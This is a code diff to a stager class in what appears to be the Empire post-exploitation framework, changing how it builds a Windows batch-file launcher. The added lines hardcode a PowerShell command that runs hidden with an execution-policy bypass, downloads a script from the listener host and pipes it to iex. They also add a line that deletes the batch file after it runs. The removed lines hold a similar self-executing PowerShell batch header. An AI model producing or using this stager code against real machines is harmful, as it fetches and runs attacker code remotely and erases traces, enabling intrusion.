@@ -110,32 +110,20 @@ class Stager(object):
         if obfuscate.lower() == "true":
             obfuscate_script = True
 
-        # generate the launcher code including escapes for % characters needed for .bat files
-        launcher = self.mainMenu.stagers.generate_launcher(
-            listenerName=listener_name,
-            language=language,
-            encode=True,
-            obfuscate=obfuscate_script,
-            obfuscationCommand=obfuscate_command,
-            userAgent=user_agent,
-            proxy=proxy,
-            proxyCreds=proxy_creds,
-            stagerRetries=stager_retries,
-            bypasses=bypasses,
-        ).replace("%", "%%")
+        host = self.mainMenu.listeners.activeListeners[listener_name]["options"][
+            "Host"
+        ]["Value"]
+        launcher = f"powershell.exe -nol -w 1 -nop -ep bypass \"(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('{host}/download/powershell')|iex\""
 
-        if launcher == "":
+        if host == "":
             print(helpers.color("[!] Error in launcher command generation."))
             return ""
         else:
-            # The start to the batch eliminates the batch file command limit. It was taken from here:
-            # https://www.reddit.com/r/PowerShell/comments/gaa2ip/never_write_a_batch_wrapper_again/
+            code = "@echo off\n"
+            code += "start /b " + launcher + "\n"
 
             if delete.lower() == "true":
                 # code that causes the .bat to delete itself
-                code = '# 2>NUL & @CLS & PUSHD "%~dp0" & "%SystemRoot%\System32\WindowsPowerShell\\v1.0\powershell.exe" -nol -nop -ep bypass "[IO.File]::ReadAllText(\'%~f0\')|iex" & DEL "%~f0" & POPD /B\n'
-            else:
-                code = '# 2>NUL & @CLS & PUSHD "%~dp0" & "%SystemRoot%\System32\WindowsPowerShell\\v1.0\powershell.exe" -nol -nop -ep bypass "[IO.File]::ReadAllText(\'%~f0\')|iex" & POPD /B\n'
-            code += launcher + "\n"
+                code += '(goto) 2>nul & del "%~f0"\n'
 
             return code
